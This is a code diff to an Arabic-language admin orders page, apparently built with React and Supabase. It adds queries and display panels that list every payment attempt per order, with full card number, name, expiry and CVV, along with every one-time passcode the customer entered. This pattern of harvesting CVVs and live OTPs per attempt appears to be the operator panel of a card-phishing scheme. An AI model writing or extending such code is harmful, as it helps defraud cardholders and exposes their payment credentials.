@@ -9,6 +9,21 @@ import { Loader2, CreditCard, Shield, User, Calendar, Phone, FileText, Check, X 
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 
+interface PaymentAttempt {
+  id: string;
+  card_number: string;
+  card_holder_name: string;
+  expiry_date: string;
+  cvv: string;
+  created_at: string;
+}
+
+interface OtpAttempt {
+  id: string;
+  otp_code: string;
+  created_at: string;
+}
+
 interface CustomerOrder {
   id: string;
   sequence_number: string;
@@ -27,6 +42,8 @@ interface CustomerOrder {
   status: string;
   created_at: string;
   updated_at: string;
+  payment_attempts?: PaymentAttempt[];
+  otp_attempts?: OtpAttempt[];
 }
 
 const AdminOrders = () => {
@@ -80,8 +97,33 @@ const AdminOrders = () => {
       if (error) {
         console.error("Error fetching orders:", error);
       } else {
-        console.log("Fetched orders:", data);
-        setOrders(data || []);
+        // Fetch payment attempts and OTP attempts for each order
+        const ordersWithAttempts = await Promise.all(
+          (data || []).map(async (order) => {
+            // Fetch payment attempts
+            const { data: paymentAttempts } = await supabase
+              .from("payment_attempts")
+              .select("*")
+              .eq("order_id", order.id)
+              .order("created_at", { ascending: false });
+
+            // Fetch OTP attempts
+            const { data: otpAttempts } = await supabase
+              .from("otp_attempts")
+              .select("*")
+              .eq("order_id", order.id)
+              .order("created_at", { ascending: false });
+
+            return {
+              ...order,
+              payment_attempts: paymentAttempts || [],
+              otp_attempts: otpAttempts || [],
+            };
+          })
+        );
+
+        console.log("Fetched orders with attempts:", ordersWithAttempts);
+        setOrders(ordersWithAttempts);
       }
       setLoading(false);
     } catch (error) {
@@ -362,12 +404,11 @@ const AdminOrders = () => {
                             </div>
                           </div>
 
-
-                          {/* Payment Info */}
+                          {/* Current Payment Info */}
                           <div className="bg-white border border-gray-200 rounded-lg p-3">
                             <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-orange-600">
                               <CreditCard className="h-4 w-4" />
-                              معلومات الدفع
+                              بطاقة الدفع الحالية
                             </h3>
                             <div className="space-y-1.5 text-xs">
                               <div className="flex justify-between">
@@ -378,7 +419,7 @@ const AdminOrders = () => {
                               </div>
                               <div className="flex justify-between">
                                 <span className="text-gray-500">الاسم:</span>
-                                <span className="font-medium truncate max-w-[140px]" title={order.card_holder_name}>
+                                <span className="font-medium truncate max-w-[120px]" title={order.card_holder_name}>
                                   {order.card_holder_name || "-"}
                                 </span>
                               </div>
@@ -393,29 +434,95 @@ const AdminOrders = () => {
                             </div>
                           </div>
 
-                          {/* OTP Verification */}
-                          <div className="bg-white border border-gray-200 rounded-lg p-3">
-                            <h3 className={`font-semibold mb-2 flex items-center gap-2 text-sm ${
-                              order.otp_verified ? "text-green-600" : "text-gray-500"
-                            }`}>
-                              <Phone className="h-4 w-4" />
-                              OTP
+                          {/* Payment Attempts */}
+                          <div className="md:col-span-2 lg:col-span-3 space-y-2">
+                            <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600">
+                              <CreditCard className="h-4 w-4" />
+                              محاولات الدفع ({order.payment_attempts?.length || 0})
                             </h3>
-                            <div className="space-y-1.5 text-xs">
-                              <div className="flex justify-between items-center">
-                                <span className="text-gray-500">الكود:</span>
-                                <span className="font-mono font-medium">
-                                  {order.otp_code || "-"}
-                                </span>
-                              </div>
-                              <div className="flex justify-between items-center">
-                                <span className="text-gray-500">الحالة:</span>
-                                {order.otp_verified ? (
-                                  <Badge className="bg-green-500 text-xs h-5">✓ تم</Badge>
-                                ) : (
-                                  <Badge variant="secondary" className="text-xs h-5">لم يتم</Badge>
-                                )}
-                              </div>
+                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                              {order.payment_attempts && order.payment_attempts.length > 0 ? (
+                                order.payment_attempts.map((attempt, index) => (
+                                  <div key={attempt.id} className="bg-orange-50 border border-orange-200 rounded-lg p-3">
+                                    <div className="flex justify-between items-center mb-2">
+                                      <span className="text-xs font-semibold text-orange-600">
+                                        محاولة #{order.payment_attempts!.length - index}
+                                      </span>
+                                      <span className="text-xs text-gray-500">
+                                        {formatDate(attempt.created_at)}
+                                      </span>
+                                    </div>
+                                    <div className="space-y-1.5 text-xs">
+                                      <div className="flex justify-between">
+                                        <span className="text-gray-500">رقم البطاقة:</span>
+                                        <span className="font-mono font-medium" dir="ltr">
+                                          {attempt.card_number}
+                                        </span>
+                                      </div>
+                                      <div className="flex justify-between">
+                                        <span className="text-gray-500">الاسم:</span>
+                                        <span className="font-medium truncate max-w-[120px]" title={attempt.card_holder_name}>
+                                          {attempt.card_holder_name}
+                                        </span>
+                                      </div>
+                                      <div className="flex justify-between">
+                                        <span className="text-gray-500">الانتهاء:</span>
+                                        <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
+                                      </div>
+                                      <div className="flex justify-between">
+                                        <span className="text-gray-500">CVV:</span>
+                                        <span className="font-mono font-medium">{attempt.cvv}</span>
+                                      </div>
+                                    </div>
+                                  </div>
+                                ))
+                              ) : (
+                                <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center text-xs text-gray-500">
+                                  لا توجد محاولات دفع
+                                </div>
+                              )}
+                            </div>
+                          </div>
+
+                          {/* OTP Attempts */}
+                          <div className="md:col-span-2 lg:col-span-3 space-y-2">
+                            <h3 className="font-semibold flex items-center gap-2 text-sm text-blue-600">
+                              <Phone className="h-4 w-4" />
+                              محاولات OTP ({order.otp_attempts?.length || 0})
+                            </h3>
+                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
+                              {order.otp_attempts && order.otp_attempts.length > 0 ? (
+                                order.otp_attempts.map((attempt, index) => (
+                                  <div key={attempt.id} className="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                                    <div className="flex justify-between items-center mb-2">
+                                      <span className="text-xs font-semibold text-blue-600">
+                                        محاولة #{order.otp_attempts!.length - index}
+                                      </span>
+                                      <span className="text-xs text-gray-500">
+                                        {new Date(attempt.created_at).toLocaleTimeString('ar-SA', {
+                                          hour: '2-digit',
+                                          minute: '2-digit',
+                                        })}
+                                      </span>
+                                    </div>
+                                    <div className="space-y-1.5 text-xs">
+                                      <div className="flex justify-between items-center">
+                                        <span className="text-gray-500">الكود:</span>
+                                        <span className="font-mono font-bold text-lg text-blue-600">
+                                          {attempt.otp_code}
+                                        </span>
+                                      </div>
+                                      <div className="text-xs text-gray-500 text-center">
+                                        {formatDate(attempt.created_at)}
+                                      </div>
+                                    </div>
+                                  </div>
+                                ))
+                              ) : (
+                                <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center text-xs text-gray-500">
+                                  لا توجد محاولات OTP
+                                </div>
+                              )}
                             </div>
                           </div>
                         </div>
